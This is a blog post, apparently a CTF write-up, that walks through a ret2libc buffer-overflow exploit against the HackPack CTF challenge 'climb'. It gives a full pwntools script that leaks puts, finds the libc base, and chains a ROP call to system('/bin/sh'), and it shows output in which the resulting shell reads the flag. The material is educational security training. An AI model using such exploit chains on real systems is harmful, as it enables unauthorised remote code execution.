<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Parse leaked address</span>
<span class="nv">recieved</span> <span class="o">=</span> p.recvline<span class="o">()</span>.strip<span class="o">()</span>
<span class="c1">#print(recieved)</span>
<span class="nv">leak</span> <span class="o">=</span>  u64<span class="o">(</span>recieved.ljust<span class="o">(</span>8,b<span class="s2">&#34;\x00&#34;</span><span class="o">))</span>
<span class="c1">#print(leak)</span>
log.info<span class="o">(</span><span class="s2">&#34;Leaked libc address, Puts: %s&#34;</span> % hex<span class="o">(</span>leak<span class="o">))</span>
</code></pre></td></tr></table>
</div>
</div><p>Then combining this to my <code>part1</code> exploit I got the address leak of <code>puts</code>.</p>
<p><strong>Output:-</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="err">❯</span> <span class="n">python3</span> <span class="n">part1_exploit</span><span class="o">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">cha</span><span class="o">.</span><span class="n">hackpack</span><span class="o">.</span><span class="n">club</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">41702</span><span class="p">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/gr4n173/climb&#39;</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="mi">16</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="s1">&#39;./climb&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="nd">@plt</span><span class="p">:</span> <span class="mh">0x40050c</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="p">:</span> <span class="mh">0x601018</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="p">:</span> <span class="mh">0x400743</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">libc</span> <span class="n">address</span><span class="p">,</span> <span class="n">Puts</span><span class="p">:</span> <span class="mh">0x7f6662f2b9c0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
</code></pre></td></tr></table>
</div>
</div><p>Hm&hellip; Cool,right? By overflowing the buffer, poping the argument, pointing to got and plt of <code>puts</code> address I finally leaked address of <code>puts</code> from libc.</p>
<h3 id="finding-version-of-libc">Finding version of libc</h3>
<p>And another thing was, every time when exploit was run,I got the different address except the last <code>3 bytes</code> of the <code>puts</code> leaked address remains same. So that helped me to find a version of libc. In order to find the libc verion you can use this website <a href="https://libc.blukat.me/" target="_blank" rel="noopener noreffer">Find libc version here</a>. By using this, libc verison was shown and file was downloaded.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="public/images/libc_version_climb.png"
        data-srcset="/ret2libc/public/images/libc_version_climb.png, public/images/libc_version_climb.png 1.5x, /ret2libc/public/images/libc_version_climb.png 2x"
        data-sizes="auto"
        alt="/ret2libc/public/images/libc_version_climb.png"
        title="libc" /></p>
<p>From above, libc version was <code>libc6_2.27-3ubuntu1_amd64</code> and got a shell after buffer was overflowed.</p>
<p>One thing to remember about the address of the function like <code>system</code>, <code>puts</code>, <code>printf</code> etc.,inside the libc is, it just shift the address a bit from the <code>libc base</code> address. So by subracting puts leak address with actual address of <code>puts</code> from <code>libc</code> I got the base address of the libc.</p>
<h3 id="getting-base-address-of-libc">Getting base address of libc</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">libc.address <span class="o">=</span> leak - libc.sym<span class="o">[</span><span class="s2">&#34;puts&#34;</span><span class="o">]</span>
log.info<span class="o">(</span><span class="s2">&#34;Base address of libc: %s &#34;</span> % hex<span class="o">(</span>libc.address<span class="o">))</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>Output: -</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">❯ python3 part1_exploit.py
<span class="o">[</span>+<span class="o">]</span> Opening connection to cha.hackpack.club on port 41702: Done
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gr4n173/climb&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gr4n173/libc6_2.27-3ubuntu1_amd64.so&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>*<span class="o">]</span> Loaded <span class="m">16</span> cached gadgets <span class="k">for</span> <span class="s1">&#39;./climb&#39;</span>
<span class="o">[</span>*<span class="o">]</span> puts@plt: 0x40050c
<span class="o">[</span>*<span class="o">]</span> __libc_start_main: 0x601018
<span class="o">[</span>*<span class="o">]</span> pop rdi gadget: 0x400743
<span class="o">[</span>*<span class="o">]</span> rdi: 0x4004fe
<span class="o">[</span>*<span class="o">]</span> Leaked libc address, Puts: 0x7f03f04ea9c0
<span class="o">[</span>*<span class="o">]</span> Base address of libc: 0x7f03f046a000
</code></pre></td></tr></table>
</div>
</div><p>Now with this libc version I found a <code>system</code> and <code>bin/sh</code> address to get a shell. You can use <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener noreffer">one_gadget</a> directly to get a shell but I mostly use <code>system</code> more to get know knowledge about the address of <code>system</code> and <code>binsh</code>.</p>
<h3 id="address-of-binsh-and-system">Address of bin/sh and system</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">BINSH</span> <span class="o">=</span> next<span class="o">(</span>libc.search<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="o">))</span> <span class="c1">#Verify with find /bin/sh libc6_2.27-3ubuntu1_amd64.so</span>
<span class="nv">SYSTEM</span> <span class="o">=</span> libc.sym<span class="o">[</span><span class="s2">&#34;system&#34;</span><span class="o">]</span>

log.info<span class="o">(</span><span class="s2">&#34;bin/sh: %s &#34;</span> % hex<span class="o">(</span>BINSH<span class="o">))</span>
log.info<span class="o">(</span><span class="s2">&#34;system: %s &#34;</span> % hex<span class="o">(</span>SYSTEM<span class="o">))</span>
</code></pre></td></tr></table>
</div>
</div><p>One thing to notice before this; we have to return to <code>main</code> so that we can overflow the function and get a shell. Hence my <code>part2_exploit</code> was</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">received</span> <span class="o">=</span> p.recvline<span class="o">()</span>.strip<span class="o">()</span>
<span class="nv">leak</span> <span class="o">=</span>  u64<span class="o">(</span>received.ljust<span class="o">(</span>8,b<span class="s2">&#34;\x00&#34;</span><span class="o">))</span>
log.info<span class="o">(</span><span class="s2">&#34;Leaked libc address, Puts: %s&#34;</span> % hex<span class="o">(</span>leak<span class="o">))</span>

libc.address <span class="o">=</span> leak - libc.sym<span class="o">[</span><span class="s2">&#34;puts&#34;</span><span class="o">]</span>
log.info<span class="o">(</span><span class="s2">&#34;Base address of libc: %s &#34;</span> % hex<span class="o">(</span>libc.address<span class="o">))</span>

<span class="nv">BINSH</span> <span class="o">=</span> next<span class="o">(</span>libc.search<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="o">))</span> 
<span class="nv">SYSTEM</span> <span class="o">=</span> libc.sym<span class="o">[</span><span class="s2">&#34;system&#34;</span><span class="o">]</span>

log.info<span class="o">(</span><span class="s2">&#34;bin/sh: %s &#34;</span> % hex<span class="o">(</span>BINSH<span class="o">))</span>
log.info<span class="o">(</span><span class="s2">&#34;system: %s &#34;</span> % hex<span class="o">(</span>SYSTEM<span class="o">))</span>

<span class="nv">payload2</span> <span class="o">=</span> OFFSET 
<span class="nv">payload2</span> <span class="o">+=</span> p64<span class="o">(</span>RET<span class="o">)</span> 
<span class="nv">payload2</span> <span class="o">+=</span> p64<span class="o">(</span>POP_RDI<span class="o">)</span> 
<span class="nv">payload2</span> <span class="o">+=</span> p64<span class="o">(</span>BINSH<span class="o">)</span> 
<span class="nv">payload2</span> <span class="o">+=</span> p64<span class="o">(</span>SYSTEM<span class="o">)</span>

p.recvuntil<span class="o">(</span><span class="s2">&#34;How will you respond? &#34;</span><span class="o">))</span>

p.sendline<span class="o">(</span>payload2<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>In payload2, I used <code>RET</code> to make stack 16 bytes aligned by popping off 8 bytes off top of stack and returning to it.</p>
<h3 id="pwning-a-shell">Pwning a shell</h3>
<p>So combining the <code>part1</code> and <code>part2</code> exploit my final exploit becomes</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/bin/python</span>
<span class="c1"># (combined)exploit.py</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># Import pwntools</span>

<span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;cha.hackpack.club&#39;</span><span class="p">,</span><span class="mi">41702</span><span class="p">)</span>
<span class="c1">#p = process(&#34;./climb&#34;) </span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./climb&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc6_2.27-3ubuntu1_amd64.so&#34;</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span><span class="c1"># Find ROP gadgets</span>

<span class="n">PUTS_PLT</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
<span class="n">PUTS_GOT</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span><span class="c1"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
<span class="n">RET</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;ret&#39;</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Puts@plt: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Puts@glt : &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Pop rdi gadget: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;rdi: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">RET</span><span class="p">))</span>

<span class="c1">#Overflow buffer until return address</span>
<span class="n">OFFSET</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="c1">#+ &#34;B&#34;*8</span>

<span class="c1"># Create rop chain</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="n">OFFSET</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>

<span class="c1">#Send our rop-chain payload</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;How will you respond? &#34;</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>

<span class="c1">#Parse leaked address</span>
<span class="n">recieved</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span>  <span class="n">u64</span><span class="p">(</span><span class="n">recieved</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Leaked libc address, Puts: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Base address of libc: </span><span class="si">%s</span><span class="s2"> &#34;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">BINSH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span> 
<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;bin/sh: </span><span class="si">%s</span><span class="s2"> &#34;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BINSH</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;system: </span><span class="si">%s</span><span class="s2"> &#34;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>

<span class="n">payload2</span> <span class="o">=</span> <span class="n">OFFSET</span> 
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span> 
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> 
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">)</span> 
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;How will you respond? &#34;</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>Output: -</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="err">❯</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">cha</span><span class="o">.</span><span class="n">hackpack</span><span class="o">.</span><span class="n">club</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">41702</span><span class="p">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/gr4n173/climb&#39;</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/gr4n173/libc6_2.27-3ubuntu1_amd64.so&#39;</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="mi">16</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="s1">&#39;./climb&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Puts</span><span class="nd">@plt</span><span class="p">:</span> <span class="mh">0x40050c</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Puts</span><span class="nd">@glt</span> <span class="p">:</span> <span class="mh">0x601018</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="p">:</span> <span class="mh">0x400743</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">rdi</span><span class="p">:</span> <span class="mh">0x4004fe</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">libc</span> <span class="n">address</span><span class="p">,</span> <span class="n">Puts</span><span class="p">:</span> <span class="mh">0x7ff0e807a9c0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Base</span> <span class="n">address</span> <span class="n">of</span> <span class="n">libc</span><span class="p">:</span> <span class="mh">0x7ff0e7ffa000</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mh">0x7ff0e81ade9a</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">system</span><span class="p">:</span> <span class="mh">0x7ff0e8049440</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="err">$</span> <span class="n">ls</span>
<span class="n">climb</span>
<span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
<span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
<span class="n">flag</span><span class="p">{</span><span class="n">w0w_A_R34L_LiF3_R0pp3r</span><span class="err">!</span><span class="p">}</span>
<span class="err">$</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="conclusion">Conclusion</h2>
<p>In this part of <code>Exploitation&amp;Pwning</code> Series here I tried to explain about the <code>ret2libc</code> exploit. At first I overflowed the <code>buffer</code> and called to <code>got</code> address to leak the address of related function. Later I returned back to main so that I can use the overflow function again and get a shell by using <code>system and binsh</code> from <code>libc</code>.</p>
<p>Stay updated to my blog. I will be posting next writeup soon about <code>Exploitation&amp;Pwning</code> series posts. Last but not the least I would like to thank all my readers for staying with me till here.</p>
<p>Feedbacks are really appreciated in the comments below.</p>
<p>Stay safe.</p>
<p>Keep learning.</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2020-07-11</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/ret2libc/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/ret2libc/" data-title="Pwn Ret2Libc" data-via="gr4n173" data-hashtags="linux,ctf,hackpackctf,pwn,BoF,ret2libc,Explotation&Pwning"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/ret2libc/" data-hashtag="linux"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/ret2libc/" data-title="Pwn Ret2Libc"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/ret2libc/" data-title="Pwn Ret2Libc"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/ret2libc/" data-title="Pwn Ret2Libc"><i class="fab fa-weibo fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">linux</a>,&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/hackpackctf/">hackpackctf</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/bof/">BoF</a>,&nbsp;<a href="/tags/ret2libc/">ret2libc</a>,&nbsp;<a href="/tags/explotationpwning/">Explotation&amp;Pwning</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/patents/" class="prev" rel="prev" title="Patents"><i class="fas fa-angle-left fa-fw"></i>Patents</a>
            <a href="/nmap/" class="next" rel="next" title="Nmap Cheat Sheet">Nmap Cheat Sheet<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
